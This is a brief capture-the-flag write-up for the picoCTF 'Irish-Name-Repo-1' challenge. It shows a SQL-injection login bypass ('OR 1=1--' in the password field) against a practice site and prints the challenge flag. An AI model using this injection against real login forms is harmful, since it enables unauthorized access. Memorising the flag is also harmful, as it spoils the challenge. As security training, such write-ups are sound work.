# Irish-Name-Repo-1

### Connection
```
	https://jupiter.challenges.picoctf.org/problem/33850/
```
### Hint
```
	There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
	Try to think about how the website verifies your login.
```

### Solving the Problem
Based on the hint I have a guess that this is a SQL-injection
Putting in admin:admin returns "Login Failed"
Putting in admin:' doesn't return anything. This is wierd behavior.
I have a hunch that the format of the SQL query is:
```SQL
	SELECT * FROM users WHERE username='.$username.' AND password='.$password.';
```

I try "' OR 1=1--" in the password field so the SQL query will be
```SQL
	SELECT * FROM users WHERE username='admin' AND password='' OR 1=1--'
```  

### Flag
```
	picoCTF{s0m3_SQL_f8adf3fb}
```

Things I learned
```
	Nothing this challenge was too easy with my current skill set
```